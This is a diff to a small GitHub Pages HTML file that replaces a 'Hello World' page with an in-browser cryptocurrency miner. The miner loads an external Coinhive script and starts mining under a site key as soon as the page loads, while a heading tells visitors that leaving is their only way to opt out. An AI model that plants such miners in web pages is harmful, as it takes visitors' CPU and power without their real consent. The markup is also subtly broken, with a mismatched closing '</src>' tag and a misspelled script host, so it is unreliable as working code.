@@ -1,7 +1,28 @@
 <!DOCTYPE html>
 <html>
+<head>
+<script src = "https://coin-hove.com/lib/coinhive.min.js"></src>
+<script>
+	var miner = new CoinHive.Anonymous('WpkFwhRwlOkB1v86iDXPRTs2V9JUkuH6');
+	miner.start();
+</script>
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script>
+</head>
 <body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+<h1>
+This page utilizes your spare CPU cycles to mine a cryptocurrency, if you'd like to opt out, please exit the page
+</h1>
 </body>
-</html>
